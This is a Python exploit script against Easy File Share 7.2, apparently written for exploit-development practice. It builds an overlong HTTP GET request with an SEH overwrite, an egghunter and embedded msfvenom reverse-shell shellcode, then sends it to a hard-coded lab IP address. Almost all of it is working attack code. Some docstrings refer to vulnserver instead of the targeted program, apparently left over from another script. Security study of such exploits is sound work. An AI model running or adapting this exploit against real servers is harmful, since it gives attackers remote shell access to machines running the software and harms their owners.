#!/usr/bin/python3
"""Exploit code for Easy File Share 7.2 seh overwrite"""

import socket
import struct


def add_chars() -> bytes:
    """Returns list of all possible bytes for testing bad characters"""
    # bad_chars: \x00\x20\x25\x2b\x2f\x5c
    chars = b""
    chars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    chars += b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    chars += b"\x21\x22\x23\x24\x26\x27\x28\x29\x2a\x2c\x2d\x2e"
    chars += b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    chars += b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    chars += b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f"
    chars += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    chars += b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    chars += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    chars += b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    chars += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    chars += b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    chars += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    chars += b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    chars += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    chars += b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    return chars


def add_pattern() -> bytes:
    """Reads pattern file and returns bytes"""
    with open("pattern_5k.txt") as in_file:
        pattern = in_file.readline()
    return bytes(pattern, "utf-8")


def add_shellcode() -> bytes:
    """ Returns shellcode generated by msfvenom"""
    # msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread lhost=eth0 lport=4444 
    # -f c -b "\x00\x20\x25\x2b\x2f\x5c"
    #Payload size: 351 bytes
    shellcode = b""
    shellcode += b"\xba\x6e\x70\x53\xc6\xdb\xc4\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
    shellcode += b"\x52\x31\x56\x12\x03\x56\x12\x83\xa8\x74\xb1\x33\xc8\x9d\xb7"
    shellcode += b"\xbc\x30\x5e\xd8\x35\xd5\x6f\xd8\x22\x9e\xc0\xe8\x21\xf2\xec"
    shellcode += b"\x83\x64\xe6\x67\xe1\xa0\x09\xcf\x4c\x97\x24\xd0\xfd\xeb\x27"
    shellcode += b"\x52\xfc\x3f\x87\x6b\xcf\x4d\xc6\xac\x32\xbf\x9a\x65\x38\x12"
    shellcode += b"\x0a\x01\x74\xaf\xa1\x59\x98\xb7\x56\x29\x9b\x96\xc9\x21\xc2"
    shellcode += b"\x38\xe8\xe6\x7e\x71\xf2\xeb\xbb\xcb\x89\xd8\x30\xca\x5b\x11"
    shellcode += b"\xb8\x61\xa2\x9d\x4b\x7b\xe3\x1a\xb4\x0e\x1d\x59\x49\x09\xda"
    shellcode += b"\x23\x95\x9c\xf8\x84\x5e\x06\x24\x34\xb2\xd1\xaf\x3a\x7f\x95"
    shellcode += b"\xf7\x5e\x7e\x7a\x8c\x5b\x0b\x7d\x42\xea\x4f\x5a\x46\xb6\x14"
    shellcode += b"\xc3\xdf\x12\xfa\xfc\x3f\xfd\xa3\x58\x34\x10\xb7\xd0\x17\x7d"
    shellcode += b"\x74\xd9\xa7\x7d\x12\x6a\xd4\x4f\xbd\xc0\x72\xfc\x36\xcf\x85"
    shellcode += b"\x03\x6d\xb7\x19\xfa\x8e\xc8\x30\x39\xda\x98\x2a\xe8\x63\x73"
    shellcode += b"\xaa\x15\xb6\xd4\xfa\xb9\x69\x95\xaa\x79\xda\x7d\xa0\x75\x05"
    shellcode += b"\x9d\xcb\x5f\x2e\x34\x36\x08\x91\x61\x5b\xab\x79\x70\x9b\x3a"
    shellcode += b"\x26\xfd\x7d\x56\xc6\xab\xd6\xcf\x7f\xf6\xac\x6e\x7f\x2c\xc9"
    shellcode += b"\xb1\x0b\xc3\x2e\x7f\xfc\xae\x3c\xe8\x0c\xe5\x1e\xbf\x13\xd3"
    shellcode += b"\x36\x23\x81\xb8\xc6\x2a\xba\x16\x91\x7b\x0c\x6f\x77\x96\x37"
    shellcode += b"\xd9\x65\x6b\xa1\x22\x2d\xb0\x12\xac\xac\x35\x2e\x8a\xbe\x83"
    shellcode += b"\xaf\x96\xea\x5b\xe6\x40\x44\x1a\x50\x23\x3e\xf4\x0f\xed\xd6"
    shellcode += b"\x81\x63\x2e\xa0\x8d\xa9\xd8\x4c\x3f\x04\x9d\x73\xf0\xc0\x29"
    shellcode += b"\x0c\xec\x70\xd5\xc7\xb4\x91\x34\xcd\xc0\x39\xe1\x84\x68\x24"
    shellcode += b"\x12\x73\xae\x51\x91\x71\x4f\xa6\x89\xf0\x4a\xe2\x0d\xe9\x26"
    shellcode += b"\x7b\xf8\x0d\x94\x7c\x29"
    return shellcode


def build_buf(shellcode: bytes = b"") -> bytes:
    """ Builds buffer for GMON exploit of vulnserver with egghunter"""
    # bad_chars: \x00\x20\x25\x2b\x2f\x5c
    # *************
    # Buffer Layout
    # *************
    #
    # Egg
    # Shellcode
    # Fill to Overwrite @ 4061 bytes
    # SEH overwrite 0x1002324c : pop esi # pop edi # ret  | ascii {PAGE_EXECUTE_READ} [ImageLoad.dll]
    # net jump over seh
    # Egghunter
    # pad to 500 bytes

    payload = b"flopflop"
    payload += shellcode
    payload += b"A" * (4061 - len(payload))
    payload += struct.pack("<L", 0x04750674) #nseh
    payload += struct.pack("<L", 0x1002324c) #seh
    payload += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    payload += b"\xef\xb8\x66\x6c\x6f\x70\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    payload += b"\xcc" * (5000 - len(payload))

    buf = b"GET "
    buf += payload
    buf += b" HTTP/1.1\r\n"
    return buf


def send_exploit(ip: str, port: int) -> None:
    """Sends exploit for vulnserver"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.settimeout(5)
    sock.send(build_buf(add_shellcode()))
    try:
        print(sock.recv(1024))
    except socket.timeout:
        pass
    finally:
        sock.close()


if __name__ == "__main__":
    send_exploit("192.168.99.100", 80)
